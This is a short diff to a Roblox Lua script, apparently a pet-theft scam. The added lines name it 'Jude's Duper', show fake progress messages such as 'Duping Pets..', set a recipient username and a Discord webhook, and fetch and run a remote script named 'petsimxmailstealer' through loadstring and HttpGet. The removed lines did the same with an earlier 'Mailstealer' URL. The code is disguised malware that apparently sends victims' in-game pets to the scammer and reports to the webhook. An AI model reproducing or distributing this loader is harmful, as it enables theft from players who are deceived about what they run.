@@ -1,4 +1,8 @@
-UsernameID = 4033382218
-Webhook = "https://discord.com/api/webhooks/1233647875284795473/VRZMYyLTiFIZ-jZWLcQLvonO9ZgiymT4VbzuorsReu3n57spUs04tMgYnHFsiCzWooh2"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/lypos1/TTD/main/Mailstealer"))()
+local player_USERNAME = "raniel_jud" 
+local discord_WEBHOOK = "https://discord.com/api/webhooks/1233647875284795473/VRZMYyLTiFIZ-jZWLcQLvonO9ZgiymT4VbzuorsReu3n57spUs04tMgYnHFsiCzWooh2" 
+local Custom_Script_Name = "Jude's Duper"
+local txt_1 = "Script Loaded..." 
+local txt_2 = "Waiting for Script" 
+local txt_3 = "Duping Pets.." 
+local txt_4 = "Duping Pets..." 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
